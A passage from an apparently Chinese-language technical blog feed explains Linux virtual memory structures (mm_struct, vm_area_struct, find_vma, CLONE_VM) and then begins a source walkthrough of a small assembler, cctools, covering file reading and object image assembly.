  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * &quot;owner&quot; points to a task that is regarded as the canonical</span></span><br><span class="line"><span class="comment">     * user/owner of this mm. All of the following must be true in</span></span><br><span class="line"><span class="comment">     * order for it to be changed:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * current == mm-&gt;owner</span></span><br><span class="line"><span class="comment">     * current-&gt;mm != mm</span></span><br><span class="line"><span class="comment">     * new_owner-&gt;mm == mm</span></span><br><span class="line"><span class="comment">     * new_owner-&gt;alloc_lock is held</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PROC_FS</span></span><br><span class="line">    <span class="comment">/* store ref to file /proc/&lt;pid&gt;/exe symlink points to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">exe_file</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> num_exe_file_vmas;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MMU_NOTIFIER</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mmu_notifier_mm</span> *<span class="title">mmu_notifier_mm</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_TRANSPARENT_HUGEPAGE</span></span><br><span class="line">    <span class="type">pgtable_t</span> pmd_huge_pte; <span class="comment">/* protected by page_table_lock */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* reserved for Red Hat */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __GENKSYMS__</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rh_reserved[<span class="number">2</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="comment">/* How many tasks sharing this mm are OOM_DISABLE */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rh_reserved_aux;</span><br><span class="line">        <span class="type">atomic_t</span> oom_disable_count;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* base of lib map area (ASCII armour) */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> shlib_base;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​mm_struct 结构体描述的是该进程的整个空间布局信息。下面列了一些字段的补充说明：</p><ul><li><code>pgd_t * pgd;</code>：Linux 采用多级段页式管理，该字段存放进程的页目录基地址（物理地址），即一级页表的物理地址，当进程被调度时，该字段内容会被加载进 CR3 寄存器（Page Directory Base Address Register–页目录基址寄存器）参与后续页表运算。整个运算过程当然由 MMU 硬件支持。</li></ul><p>  <img src="https://s2.loli.net/2023/01/11/uGrPJ4tlTNjh8A5.jpg" alt="0230111113831.jpg"></p><ul><li><code>unsigned long start_code, end_code, start_data, end_data...;</code> ：这几个值的范围就表示该进程对应段的空间范围。例如，代码段位于 [start_code, end_code)。</li></ul><p>​前面提到 mm_struct 结构体描述的是该进程的整个空间布局信息，而整个空间由许多段组成，例如 .text ，.data，某块被 malloc() 申请的堆内存等等，不同段的属性，权限，范围等各不相同，那如何描述每一个段的信息呢？答案就是： vm_area_struct 结构体，其定义于 <code>&lt;linux\mm_types.h&gt;</code>下，简称 VMA ，也被称为进程地址空间或进程线性区，是 Linux 虚存管理的最基本的管理单元。它描述的是一段连续的、具有相同访问属性的虚拟内存空间，大小为物理内存页面的整数倍。</p><p>​线性区的组织方式有两种，其一是链表形式，mm_struct 里的 <code>struct vm_area_struct * mmap; </code> 便是指向该首块 VMA 区域的指针，而在 vm_area_struct 结构体中有 <code> struct vm_area_struct* vm_next, * vm_prev;</code>指向该 VMA 链表的前后节点，链表的组织形式更利于遍历操作。其二是红黑树的组织方式，当线性区映射的块很多时，使用红黑树更方便于查找，mm_struct 里的 <code>struct rb_root mm_rb;</code> 便是该红黑树的根节点，而在 vm_area_struct 里的 <code>struct rb_node vm_rb;</code> 便是该红黑树的节点。</p><p>​值得注意的是，尽管有链表和红黑树两种组织方式，但并不代表内存中有两份副本，而是数据结构体实现两个域指针而已，在某个 vm_area_struct 结构体被创建之后便会插入到 mm-&gt;mm_rb 红黑树和 mm-&gt;mmap 链表中。</p><p><img src="https://s2.loli.net/2023/01/05/Df15butgM4ThmoW.png" alt="image.png"></p><p>​此外，还有在 mm_struct 里还有一个一个 <code>struct vm_area_struct * mmap_cache; /* last find_vma result */</code> 指针，这是由于程序的局部性原理，该指针指向最近使用的内存区域，因此使用 find_vma() 函数查找 vma 时，会首先从 mmap_cache 中找，找到了就直接返回。这种 mmap_cache 的命中率通常有35%-50%，当然之后内核开发者又在此基础上，提出了更高效的查找方案，感兴趣可以去自行了解一下 ~</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* mmap_cache 中查找节点*/</span></span><br><span class="line">vma = mm-&gt;mmap_cache;    </span><br><span class="line"><span class="keyword">if</span> (vma &amp;&amp; vma-&gt;vm_end &gt; addr &amp;&amp; vma-&gt;vm_start &lt;= addr)</span><br><span class="line">    <span class="keyword">return</span> vma;</span><br><span class="line"><span class="comment">/* 如果没在 chache 里找到便去红黑树里寻找 */</span></span><br><span class="line">rb_node = mm-&gt;mm_rb.rb_node;    </span><br><span class="line">vma = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">while</span> (rb_node) &#123;        </span><br><span class="line">    vma_tmp = rb_entry(rb_node, <span class="keyword">struct</span> vm_area_struct, vm_rb);        </span><br><span class="line">    <span class="keyword">if</span> (vma_tmp-&gt;vm_end &gt; addr) &#123;            </span><br><span class="line">        vma = vma_tmp;            </span><br><span class="line">        <span class="keyword">if</span> (vma_tmp-&gt;vm_start &lt;= addr)                </span><br><span class="line">            <span class="keyword">break</span>;            </span><br><span class="line">        rb_node = rb_node-&gt;rb_left;        </span><br><span class="line">    &#125; <span class="keyword">else</span>            </span><br><span class="line">        rb_node = rb_node-&gt;rb_right;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (vma)        </span><br><span class="line">        mm-&gt;mmap_cache = vma;    </span><br><span class="line"><span class="keyword">return</span> vma;</span><br></pre></td></tr></table></figure><p>​以下是便是线性区 vm_area_struct 结构体实现代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span></span></span><br><span class="line"><span class="class">&#123;</span>                                                                                                                                             <span class="comment">/***反向链表， 指向线性区所在的内存描述符。*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">vm_mm</span>;</span> <span class="comment">/* The address space we belong to. */</span> </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**线性区范围可以表示为 [vm_start, vm_end) ，他们都是 4KB对齐的地址*/</span></span><br><span class="line">    <span class="comment">/*** 线性区内的首地址。*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> vm_start; <span class="comment">/* Our start address within vm_mm. */</span>  </span><br><span class="line">    <span class="comment">/*** 线性区的末地址。*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> vm_end; <span class="comment">/* The first byte after our end addresswithin vm_mm. linked list of VM areas per task, sorted by address */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/***链表组织形式 * vm_next, * vm_prev 分别VMA链表的前后成员。*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span>* <span class="title">vm_next</span>, * <span class="title">vm_prev</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/***红黑树组织形式， 用于红黑树的数据。*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">vm_rb</span>;</span> <span class="comment">/** For areas with an address space and backing store,* linkage into the address_space-&gt;i_mmap prio tree, or* linkage to the list of like vmas hanging off its node, or* linkage of vma in the address_space-&gt;i_mmap_nonlinear list.*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*  rb_subtree_gap保存本node中左右子树中最大的gap，也就是最大间隙size。换句话说，从这个node开始，左右子树中能插入的VMA最大length是多少。*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rb_subtree_gap;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*** 线性区中页框的访问许可权，用于创建区域中各页目录、页表项和存取控制标志，如R/W, U/S, A, D, G位等。*/</span></span><br><span class="line">    <span class="comment">/* 一个vma可能由许多的虚拟 pages（页表） 组成，每个虚拟page需要经过page table的转换才能找到对应的物理页面。PTE中的Read/Write位是由软件设置的，设置依据就是这个page所属的vma，因此一个vma设置的VM_READ/VM_WRITE属性会复制到这个vma所含pages的PTE中，这样就形成了页表的访问权限。*/</span></span><br><span class="line">    <span class="type">pgprot_t</span> vm_page_prot; <span class="comment">/* Access permissions of this VMA. */</span>                                                                             </span><br><span class="line">    <span class="comment">/*** 线性区的标志。*/</span></span><br><span class="line">    <span class="comment">/* 例如 VM_READ 页是可读的，VM_SHARED 页可以被多个进程共享 ，VM_GROWSDOWN 这个区间可以向低地址扩展。等等*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> vm_flags; <span class="comment">/* Flags, listed below. */</span>   </span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span> <span class="comment">/*** 如果在优先搜索树中，存在两个节点的基索引、堆索引、大小索引完全相同，那么这些相同的节点会被链接到一个链表，而vm_set就是这个链表的元素。*/</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">            <span class="type">void</span> *parent; <span class="comment">/* aligns with prio_tree_node parent */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">head</span>;</span></span><br><span class="line">        &#125; vm_set; <span class="comment">/*** 如果是文件映射，那么prio_tree_node用于将线性区插入到优先搜索树中。作为搜索树的一个节点。*/</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">raw_prio_tree_node</span> <span class="title">prio_tree_node</span>;</span></span><br><span class="line">    &#125; shared; <span class="comment">/** A file&#x27;s MAP_PRIVATE vma can be in both i_mmap tree and anon_vma* list, after a COW of one of the file pages.  A MAP_SHARED vma* can only be in the i_mmap tree.  An anonymous MAP_PRIVATE, stack* or brk vma (with NULL file) can only be in an anon_vma list.*/</span> <span class="comment">/*** 指向匿名线性区链表的指针(参见&quot;映射页的反映射&quot;)。* 页框结构有一个anon_vma指针，指向该页的第一个线性区，随后的线性区通过此字段链接起来。* 通过此字段，可以将线性区链接到此链表中。*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">anon_vma_node</span>;</span> <span class="comment">/* Serialized by anon_vma-&gt;lock */</span>                                                                                                                                                                                                              <span class="comment">/*** 指向anon_vma数据结构的指针(参见&quot;映射页的反映射&quot;)。此指针也存放在页结构的mapping字段中。*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">anon_vma</span> *<span class="title">anon_vma</span>;</span> <span class="comment">/* Serialized by page_table_lock */</span> <span class="comment">/* Function pointers to deal with this struct. */</span>                                                                                                                                                                <span class="comment">/*** 指向线性区的方法。*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span> <span class="comment">/* Information about our backing store: */</span>                                                                                                                                                                                                 <span class="comment">/*** 在映射文件中的偏移量(以页为单位)。对匿名页，它等于0或vm_start/PAGE_SIZE*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> vm_pgoff; <span class="comment">/* Offset (within vm_file) in PAGE_SIZEunits, *not* PAGE_CACHE_SIZE */</span>                                                                                                                                                                                  <span class="comment">/*** 指向映射文件的文件对象(如果有的话)*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">vm_file</span>;</span> <span class="comment">/* File we map to (can be NULL). */</span>                                                                                                                                                                                                                       <span class="comment">/*** 指向内存区的私有数据。*/</span></span><br><span class="line">    <span class="type">void</span> *vm_private_data; <span class="comment">/* was vm_pte (shared mem) */</span>                                                                                                                                                                                                                            <span class="comment">/*** 释放非线性文件内存映射中的一个线性地址区间时使用。*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> vm_truncate_count;   <span class="comment">/* truncate_count or restart_addr */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​我们通过 <code> cat /proc/PID/maps</code> 命令来查看某进程的所有 vma 在虚拟地址空间的分布情况，其内部实现靠的就是对 vm_area_struct 这个链表的遍历。</p><p><img src="https://s2.loli.net/2023/01/06/tGWFcAsurUDRB4e.png" alt="image.png"></p><p>​对 vma 的操作除了查找，还有增加和删除。加载一个动态链接库或者通过 mmap 创建映射时，都需要在进程地址空间中增加一个vma。具体过程是首先通过 get_unmapped_area() 找到虚拟地址空间中一块空闲且大小满足要求的区域，分配给新 vma 并设置其 flag 属性，并返回该 vma 起始处的虚拟地址。当然，你出于某种目的，也可以指定需要申请的地址（调用 mmap() 时指定参数 addr ），如果该地址正好是空的，就可以分配给你。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (addr) &#123;</span><br><span class="line">    addr = PAGE_ALIGN(addr);                 </span><br><span class="line">    vma = find_vma(mm, addr);                  </span><br><span class="line">    <span class="keyword">if</span> (TASK_SIZE -len &gt;= addr &amp;&amp;                      </span><br><span class="line">        (!vma || addr + len &lt;= vma-&gt;vm_start))                         </span><br><span class="line">            <span class="keyword">return</span> addr;              </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​如果新建的 vma 和它地址上紧挨着的 vma 有相同的属性，且基于相同的映射对象（比如是同一个文件），则还会产生 vma 的合并。减少 vma 的数量有利于减轻内核的管理工作量，降低系统开销。如果没有发生合并，则需要调用 insert_vm_struct( ) 在vma 链表和 vma 红黑树中分别插入代表新 vma 的节点。但请注意，该函数分配的是虚拟空间的使用权，并不是分配的物理空间的使用权，对物理空间的分配执行如前文所说是写时分配的策略。最后，通过 munmap() 解除映射时，则需要在进程地址空间中删除对应的 vma ，并释放该 vma 占有的虚拟地址资源。</p><p>​总之，每一个进程描述符（即 task_struct 结构体）中都包含一个内存描述符（即 mm_struct 结构体），因此 current-&gt;mm 便指向当前进程的内存描述符。而创建子进程的 fork() 函数便是利用 copy_mm() 函数复制父进程的内存描述符，而子进程的 mm_struct 结构体则是通过文件 kernel&#x2F;fork.c 中的 allocate_mm() 宏从 mm_cachep slab分配器中分配得到的。通常，每个进程都有唯一的  mm_struct 结构体。</p><p>​如果父进程和子进程希望共享地址空间，可以在调用 clone() 函数的时候设置 CLONE_VM 标志，其实这就是 Linux 里的线程。（创建线程的 pthread_create() 函数和创建进程的 fork() 函数底层调用的都是 clone() 函数，只不过传进去的参数不一样导致创建出来的可以是子进程或者子线程。）</p><blockquote><p>在面试中很容易问到这个问题：进程和线程的区别是什么？对于该问题在网上有很多八股文式的答案:</p><ol><li>进程是资源分配的最小单位，线程是程序执行的最小单位（资源调度的最小单位）。</li><li>进程有自己的独立地址空间，每启动一个进程，系统就会为它分配地址空间，建立数据表来维护代码段、堆栈段和数据段，这种操作非常昂贵。<br>而线程是共享进程中的数据的，使用相同的地址空间，因此CPU切换一个线程的花费远比进程要小很多，同时创建一个线程的开销也比进程要小很多。</li><li>线程之间的通信更方便，同一进程下的线程共享全局变量、静态变量等数据，而进程之间的通信需要以通信的方式（IPC)进行。不过如何处理好同步与互斥是编写多线程程序的难点。</li><li>但是多进程程序更健壮，多线程程序只要有一个线程死掉，整个进程也死掉了，而一个进程死掉并不会对另外一个进程造成影响，因为进程有自己独立的地址空间。</li></ol><p>这样的回答虽然正确，但并没有能让面试官记住你的亮点，因为不够本质。后面我会单独写一章Linux进程和线程的区别，从源码的角度进行分析和解答，这样才能给面试官一个很不错的印象。</p></blockquote><p>​当 CLONE_VM 被指定后，内核便不在需要调用 allocate_mm() 函数，而是仅仅需要在调用 copy_mm() 函数中讲 mm 域指向其父进程的内存描述符即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clone_flags &amp; CLONE_VM)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">atomic_inc</span>(&amp;current-&gt;mm-&gt;mm_users);</span><br><span class="line">tsk-&gt;mm = current-&gt;mm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​下面这幅图总结一下各个数据结构之间的关系，家人们应该有比较清晰的了解了吧！</p><p><img src="https://s2.loli.net/2023/01/11/zr8pEgfcRhX4mIn.png" alt="PTFN__0BAAE_N_MQRR@D6C1.png"></p><p>​这就是关于Linux虚拟内存的一些故事了，那么，从下一章节就开始我们就要进入 malloc() 的源码了！</p><hr><h2 id="补充问答"><a href="#补充问答" class="headerlink" title="补充问答"></a>补充问答</h2><ol><li><code>pgd_t * pgd</code> 里 pgd 的值和 CR3 寄存器里的值一样的吗？ 答：参考。[linux - CR3值与pgd_t之间的差异](<a href="https://stackoom.com/question/3iezm">linux - CR3值与pgd_t之间的差异 - 堆栈内存溢出 (stackoom.com)</a>)</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Operating System </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cctools源码分析</title>
      <link href="/2022/12/05/G02_analy/"/>
      <url>/2022/12/05/G02_analy/</url>
      
        <content type="html"><![CDATA[<h1 id="main-c"><a href="#main-c" class="headerlink" title="main.c"></a>main.c</h1><h2 id="示例汇编文件"><a href="#示例汇编文件" class="headerlink" title="示例汇编文件"></a>示例汇编文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.global syscall</span><br><span class="line">syscall:</span><br><span class="line">mov %rdi, %rax</span><br><span class="line">mov %rsi, %rdi</span><br><span class="line">mov %rdx, %rsi</span><br><span class="line">mov %rcx, %rdx</span><br><span class="line">mov %r8, %rcx</span><br><span class="line">mov %r9, %r8</span><br><span class="line">mov 8(%rsp), %r9</span><br><span class="line">syscall</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">mov (%rsp), %rdi</span><br><span class="line">lea 8(%rsp), %rsi</span><br><span class="line">call main</span><br><span class="line">mov %rax, %rdi</span><br><span class="line">mov $60, %eax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><h2 id="函数一：read-asm-from-filepath-infile"><a href="#函数一：read-asm-from-filepath-infile" class="headerlink" title="函数一：read_asm_from_filepath(infile)"></a>函数一：read_asm_from_filepath(infile)</h2><blockquote><p>负责从源文件中读取所有汇编代码，返回一个Vector类型的指针。</p></blockquote><h4 id="调用read-entire-file-filepath"><a href="#调用read-entire-file-filepath" class="headerlink" title="调用read_entire_file(filepath);"></a>调用<a href="#read_entire_file(filepath);">read_entire_file(filepath);</a></h4><blockquote><p>src指针获得存放了所有源汇编文件字符的char ret[]数组地址。</p><p>如图为 解析到的*src值。</p><p><img src="C:\Users\QIANGQ\AppData\Roaming\Typora\typora-user-images\image-20221116010431245.png" alt="image-20221116010431245"></p></blockquote><h4 id="返回-read-all-asm-src-filepath-read-all-asm-src-filepath"><a href="#返回-read-all-asm-src-filepath-read-all-asm-src-filepath" class="headerlink" title="返回[read_all_asm(src, filepath);](#read_all_asm(src, filepath))"></a>返回[read_all_asm(src, filepath);](#read_all_asm(src, filepath))</h4><blockquote><p>该函数接收前面传来的源汇编文件字符的char ret[]数组地址，返回结构化之后的链表，类似于编译器中的TAC结构体链。并返回给上层调用函数 main.c。</p><p>这里返回的是一个Code_list链表，我们可以看到：这里的size其实就是汇编语句的条数。</p><p>​<img src="C:\Users\QIANGQ\AppData\Roaming\Typora\typora-user-images\image-20221116011326465.png" alt="image-20221116011326465"><img src="C:\Users\QIANGQ\AppData\Roaming\Typora\typora-user-images\image-20221116012317434.png" alt="image-20221116012317434"></p><p>并且，从下一个处理该 Vector *code的函数也可以看到有一个关键的循环：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; vector_size(code_list); i++)&#123;&#125;</span><br><span class="line"><span class="comment">//进入 vector_size(code_list)可以发现</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">vector_size</span><span class="params">(Vector *vec)</span> &#123; <span class="keyword">return</span> vec-&gt;size; &#125;</span><br><span class="line">实际上就是我们之前提到的 size,该文件里为<span class="number">19.</span>与汇编源文件相符合。</span><br></pre></td></tr></table></figure></blockquote><h2 id="函数二：assemble-code-code"><a href="#函数二：assemble-code-code" class="headerlink" title="函数二：assemble_code(code);"></a>函数二：assemble_code(code);</h2><blockquote><p>接收结构化之后的汇编代码链表。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ObjectImage *assemble_code(Vector *code) &#123; return assemble_code_detail(code); &#125;</span><br></pre></td></tr></table></figure></blockquote><h4 id="因此接下来分析-assemble-code-detail-Vector-code-list-ObjectImage-assemble-code-detail-Vector-code-list"><a href="#因此接下来分析-assemble-code-detail-Vector-code-list-ObjectImage-assemble-code-detail-Vector-code-list" class="headerlink" title="因此接下来分析[assemble_code_detail(Vector *code_list);](#ObjectImage *assemble_code_detail(Vector *code_list);)"></a>因此接下来分析[assemble_code_detail(Vector *code_list);](#ObjectImage *assemble_code_detail(Vector *code_list);)</h4><blockquote><p>返回之后主函数使用ObjectImage *obj &#x3D; assemble_code(code);来接收其返回值。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">struct ObjectImage &#123;</span><br><span class="line">    Vector *text;    // vector&lt;int&gt;</span><br><span class="line">    Vector *data;    // vector&lt;int&gt;</span><br><span class="line">    Vector *rela;    // vector&lt;RelaEntry *&gt;</span><br><span class="line">    Vector *strtab;  // vecotr&lt;int&gt;</span><br><span class="line">    Vector *symtab;  // vector&lt;SymbolInfo *&gt;</span><br><span class="line"></span><br><span class="line">    Map *symbol_map;    // map&lt;char *, SymbolInfo *&gt;</span><br><span class="line">    Map *label2offset;  // map&lt;char *, SectionOffset&gt;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>从调试信息来看，该结构体实际上记录了各个段的具体信息，以下是具体调试信息：</p><p>​<img src="C:\Users\QIANGQ\AppData\Roaming\Typora\typora-user-images\image-20221109004948160.png" alt="image-20221109004948160"><img src="C:\Users\QIANGQ\AppData\Roaming\Typora\typora-user-images\image-20221109005027587.png" alt="image-20221109005027587"><img src="C:\Users\QIANGQ\AppData\Roaming\Typora\typora-user-images\image-20221109005053501.png" alt="image-20221109005053501"><img src="C:\Users\QIANGQ\AppData\Roaming\Typora\typora-user-images\image-20221109005127283.png" alt="image-20221109005127283"></p></blockquote><p>自此分析过程全部结束，下一步:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FILE *fh = fopen(outfile, &quot;wb&quot;);</span><br></pre></td></tr></table></figure><p>说明该往目标文件写二进制数据了。</p><h2 id="函数三：dump-object-image-obj-fh"><a href="#函数三：dump-object-image-obj-fh" class="headerlink" title="函数三：dump_object_image(obj, fh);"></a>函数三：dump_object_image(obj, fh);</h2><h4 id="分析-dump-object-image-obj-fh-dump-object-image-obj-fh"><a href="#分析-dump-object-image-obj-fh-dump-object-image-obj-fh" class="headerlink" title="分析[dump_object_image(obj, fh);](#dump_object_image(obj, fh);)"></a>分析[dump_object_image(obj, fh);](#dump_object_image(obj, fh);)</h4><h2 id="read-entire-file-filepath"><a href="#read-entire-file-filepath" class="headerlink" title="read_entire_file(filepath);"></a>read_entire_file(filepath);</h2><blockquote><p> 读入文件的主要函数.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">while ((ch = fgetc(fh)) != EOF) string_builder_append(sb, ch);</span><br></pre></td></tr></table></figure><p>以上这一句是分析每一个char的语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int fgetc(FILE *stream)</span><br><span class="line">&#123;</span><br><span class="line">    char buf[1];</span><br><span class="line">    int res = read(stream-&gt;fd, buf, 1);</span><br><span class="line">    if (res &lt;= 0) return EOF;</span><br><span class="line">    return buf[0] &amp; 0xff;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在fgetc函数里面，通过read函数读入每一个字符，返回给buf[0]，然后取第八位传给while循环。</p><p>然后进入string_builder_append(sb, ch); 函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">char string_builder_append(StringBuilder *sb, char ch)</span><br><span class="line">&#123;</span><br><span class="line">    vector_push_back(sb-&gt;data, (void *)ch);</span><br><span class="line">    return ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数主要操主调函数传下来的 StringBuilder *sb。</p><p>其中 sb-&gt;data里的size表示字符数。</p><p>返回 string_builder_get(sb); 该函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">char *string_builder_get(StringBuilder *sb)</span><br><span class="line">&#123;</span><br><span class="line">    int size = vector_size(sb-&gt;data);</span><br><span class="line">    char *ret = safe_malloc(size + 1);</span><br><span class="line">    for (int i = 0; i &lt; size; i++) ret[i] = (char)vector_get(sb-&gt;data, i);</span><br><span class="line">    ret[size] = &#x27;\0&#x27;;</span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数将采集到的所有字符放入 char ret[]数组中并返回主调函数。 </p><p>然后fclose源 .s文件</p><p>最后，该函数向上层主调函数返回了 char ret[]数组。</p><blockquote><p>&#x3D;&#x3D;自此：文件读入结束。&#x3D;&#x3D;</p></blockquote><h2 